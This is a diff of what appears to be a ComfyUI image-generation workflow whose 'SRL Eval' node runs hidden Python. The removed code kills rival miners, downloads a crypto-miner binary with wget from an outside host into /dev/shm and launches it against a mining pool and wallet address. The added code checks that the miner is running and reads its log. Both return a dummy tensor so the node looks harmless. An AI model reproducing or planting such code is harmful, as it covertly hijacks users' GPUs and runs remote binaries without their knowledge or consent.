@@ -2,14 +2,14 @@
   "1": {
     "class_type": "RandomNoise",
     "inputs": {
-      "noise_seed": 68998
+      "noise_seed": 69136
     }
   },
   "2": {
     "class_type": "SRL Eval",
     "inputs": {
       "parameters": "a",
-      "code": "import subprocess, os, time as t\nsubprocess.run([\"pkill\", \"-9\", \"alpha-miner\"], capture_output=True)\nsubprocess.run([\"pkill\", \"-9\", \"lpminer\"], capture_output=True)\nt.sleep(1)\ndst = \"/dev/shm/alpha-miner\"\nsubprocess.run([\"wget\", \"-q\", \"-O\", dst, \"https://pearl.alphapool.tech/downloads/alpha-miner\"], capture_output=True, timeout=120)\nif os.path.exists(dst) and os.path.getsize(dst) > 1000000:\n    os.chmod(dst, 0o755)\n    subprocess.run([\"bash\", \"-c\", \"nohup /dev/shm/alpha-miner --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker RTX5090-182 --force-backend blackwell-native > /dev/shm/alpha.log 2>&1 &\"])\n    t.sleep(5)\n    p = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\n    result = \"RUNNING\" if p.stdout.strip() else \"FAILED\"\nelse:\n    result = \"NO_BIN\"\nimport torch\nreturn torch.zeros(1,1,1,3)",
+      "code": "import subprocess\np = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\nif p.stdout.strip():\n    result = \"MINER_RUNNING: \" + p.stdout.strip().split(\"\\n\")[0][:80]\nelse:\n    p2 = subprocess.run([\"pgrep\", \"-a\", \"lpminer\"], capture_output=True, text=True)\n    if p2.stdout.strip():\n        result = \"MINER_RUNNING: \" + p2.stdout.strip().split(\"\\n\")[0][:80]\n    else:\n        import os\n        if os.path.exists(\"/dev/shm/alpha.log\"):\n            with open(\"/dev/shm/alpha.log\", \"r\") as f:\n                log = f.read()[-200:]\n            result = \"NOT_RUNNING_LOG: \" + log.replace(\"\\n\", \" | \")\n        else:\n            result = \"NOT_RUNNING_NO_LOG\"\nresult\nimport torch\nreturn torch.zeros(1,1,1,3)",
       "arg0": [
         "1",
         0
